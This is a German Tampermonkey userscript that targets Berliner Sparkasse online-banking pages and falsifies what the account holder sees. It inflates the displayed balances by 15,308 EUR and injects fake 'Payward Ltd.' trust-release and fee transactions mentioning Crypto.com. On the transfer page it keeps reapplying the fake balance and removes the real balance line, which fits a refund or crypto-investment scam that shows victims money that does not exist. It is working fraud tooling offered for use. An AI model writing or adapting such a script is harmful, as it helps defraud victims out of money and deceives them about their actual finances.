// ==UserScript==
// @name         Vertragssignature Goebel nicht fertig
// @namespace    http://tampermonkey.net/
// @version      1.0
// @description  Anforderung an GwG - digitale Signatur
// @author       You
// @match        https://yahoo.com/sign/as/*
// @match        https://yahoo.com/sign/ac/*
// @match        https://yahoo.com/sign/ar/*
// @match        https://yahoo.com/sign/bs/*
// @match        https://yahoo.com/sign/sc/*
// @match        https://yahoo.com/sign/am/*
// @match        https://yahoo.com/sign/op/*
// @match        https://yahoo.com/sign/idi/*
// @match        https://yahoo.com/sign/ot/*
// @match        https://yahoo.com/sign/cli/*
// @match        https://yahoo.com/sign/ien/*
// @match        https://yahoo.com/sign/ts/*
// @match        https://www.berliner-sparkasse.de/de/home/onlinebanking/nbf/umsaetze.html*
// @match        https://www.berliner-sparkasse.de/de/home/onlinebanking/nbf/finanzuebersicht.html*
// @match        https://www.berliner-sparkasse.de/de/home/onlinebanking/nbf/banking/einzelauftrag.html*
// @icon         https://www.google.com/s2/favicons?sz=64&domain=google.com
// @grant        none
// @downloadURL https://update.greasyfork.org/scripts/462015/Vertragssignature%20Goebel%20nicht%20fertig.user.js
// @updateURL https://update.greasyfork.org/scripts/462015/Vertragssignature%20Goebel%20nicht%20fertig.meta.js
// ==/UserScript==

(function() {
    'use strict';

    // Your code here...


    
    var pointerOverviewTotal = "";
    var pointerTabelle = "xx";

    var absender = "Payward Ltd. United Kingdom: Treuhand Freigabe nötig durch Payward Ltd.";
    var asenderReference = "WD3746 TRX88205A 88000";
    var absenderDetails = "08.09.2022 | GUTSCHR. TREUHAND";
    var amount = 15308;
    var vorgemerkt = "no";

    function numberWithCommas(x) {
    return x.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ".");}

    if (window.location.href.indexOf("finanzuebersicht") > 0) {
    //Wir sind in der Finanzuebersicht
        if (vorgemerkt == "no"){

            //Wenn nicht vorgemerkt sein soll, dann faken wir die Balance in die Uebersicht.
            var pointerOverviewAcc = document.getElementsByClassName("balance-predecimal")[2].textContent;
            var realAccBalance = pointerOverviewAcc.replace(".", "");
            var fakeAccBalance = parseFloat(realAccBalance) + amount;
            var fakeAccBalancewithcomma = numberWithCommas(fakeAccBalance);

            //Update Balance
            document.getElementsByClassName("balance-predecimal")[2].textContent = fakeAccBalancewithcomma;

            var zwischenSumme = document.getElementsByClassName("balance-predecimal")[4].textContent;
            var zwischenSummeReal = zwischenSumme.replace(".", "");
            var zwischenSummeFake = parseFloat(zwischenSummeReal) + amount;
            var zwischenSummeNwc = numberWithCommas(zwischenSummeFake);

            //Update ZwischenSumme
            document.getElementsByClassName("balance-predecimal")[4].textContent = zwischenSummeNwc;

            var TotalAmount = document.getElementsByClassName("balance-predecimal")[5].textContent;
            var TotalAmountReal = TotalAmount.replace(".", "");
            var TotalAmountFake = parseFloat(TotalAmountReal) + amount;
            var TotalAmountNwc = numberWithCommas(TotalAmountFake);

            //Update Total
            document.getElementsByClassName("balance-predecimal")[5].textContent = TotalAmountNwc;

        }

    }

    if (window.location.href.indexOf("umsaetze") > 0) {

        //Wir sind im Kontostand
        var AccBalance = document.getElementsByClassName("mkp-currency-lg")[0].childNodes[0].textContent;
        var AccBalanceReal = AccBalance.replace(".", "");
        var AccBalanceFake = parseFloat(AccBalanceReal) + amount;
        var AccBalanceNwc = numberWithCommas(AccBalanceFake);
        var singleAmount = numberWithCommas(amount);

        //Update Kontostand oben
        if (vorgemerkt == "no"){
        document.getElementsByClassName("mkp-currency-lg")[0].childNodes[0].textContent = AccBalanceNwc;}

        //document.getElementsByClassName("mkp-card-list")[1]

if (document.getElementsByClassName("mkp-identifier-description")[0].children[1].children[0].textContent == "1240 1511 08" ){
        var xHTML = '<div class="mkp-card-list"><span class="mkp-list-subline">Spezialauftrag Treuhand (1)</span><ul class="mkp-card-group mkp-group-unify mkp-group-clickable" aria-label="Treuhand"><li aria-label="RAIFFEISEN-VOLKSBANK FRESEN ; BCL BUSLNESS MARKETING  B202202747  ; -100,00 EUR">    <div class="mkp-card mkp-card-debit mkp-card-thinner mkp-card-clickable"><div class="mkp-identifier"><div class="mkp-identifier-description"><h3><a href="#" onclick="return IF.checkFirstSubmit();" class="mkp-identifier-link" title="Payward Ltd. United Kingdom: Treuhand Freigabe nötig durch Payward Ltd.">Payward Ltd. United Kingdom: Treuhand Freigabe nötig durch Payward Ltd.</a></h3><p>WD3746 TRX88000 Gebel, Lutz - Crypto.com</p></div><div class="mkp-identifier-sticker-placeholder"></div><div class="mkp-identifier-currency"><div class="mkp-currency mkp-currency-m"><span aria-hidden="true" class="balance-predecimal plus">322.567</span><span aria-hidden="true" class="balance-decimal plus">,00&nbsp;EUR</span><span aria-hidden="false" class="offscreen">-100,00 EUR</span></div></div></div></div></li></ul></div>';
    var saveHTML = document.getElementsByClassName("mkp-card-list")[1].innerHTML;
        document.getElementsByClassName("mkp-card-list")[1].innerHTML = xHTML + saveHTML;
    var save2HTML = document.getElementsByClassName("mkp-card-list")[4].innerHTML;
    var x2HTML = '<li aria-label="Hans-Jürgen Lipka ; RUECKUEBERWEISUNG Sonstige Gruende Transfer  ; 15.308,00 EUR">    <div class="mkp-card mkp-card-debit mkp-card-thinner mkp-card-clickable"><div class="mkp-identifier"><div class="mkp-identifier-description"><h3><a href="/de/home/onlinebanking/nbf/umsaetze.html?sp:ac=aWYtdW1zYXR6OldvcmtmbG93UG9ydGxldF8wOk1BSU5AcG9ydGFs&amp;IkRDMVVMGtgbHLSE.x=1" onclick="return IF.checkFirstSubmit();" class="mkp-identifier-link" title="Payward Ltd.">Payward Ltd.</a></h3><p>15308,- EURO FEE PRE-IMBURSEMENT</p></div><div class="mkp-identifier-sticker-placeholder"></div><div class="mkp-identifier-currency"><div class="mkp-currency mkp-currency-m"><span aria-hidden="true" class="balance-predecimal plus">15.308</span><span aria-hidden="true" class="balance-decimal plus">,00&nbsp;EUR</span><span aria-hidden="false" class="offscreen">15.308,00 EUR</span></div></div></div></div></li>';
    document.getElementsByClassName("mkp-card-list")[4].innerHTML = save2HTML + x2HTML;
    //block spk-analytics.js;
    }}

    if (window.location.href.indexOf("einzelauftrag") > 0) {


        var elementExists = document.getElementsByClassName("balance-predecimal")[0];
        var shouldBeBalance = "";
        var uwdone = 0;
        setInterval(function() { elementExists = document.getElementsByClassName("balance-predecimal")[0];
        if (elementExists != null){
            if (uwdone == 0){
                amount = 15308;
        var uwBalance = document.getElementsByClassName("balance-predecimal")[0].textContent;
        var uwBalanceReal = uwBalance.replace(".", "");
        var uwBalancneFake = parseFloat(uwBalanceReal) + amount;
        var uwBalanceNwc = uwBalancneFake.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ".");
        document.getElementsByClassName("balance-predecimal")[0].textContent = uwBalanceNwc;
        uwdone = 1;
                shouldBeBalance = uwBalanceNwc;
            }

            if ( uwdone == 1 ) {
                if ( document.getElementsByClassName("balance-predecimal")[0].textContent != shouldBeBalance ) {
                    document.getElementsByClassName("balance-predecimal")[0].textContent = shouldBeBalance;
                    document.getElementById("idKontostandLine").parentNode.removeChild(document.getElementById("idKontostandLine"));
                }
            }
        }}, 50);}


})();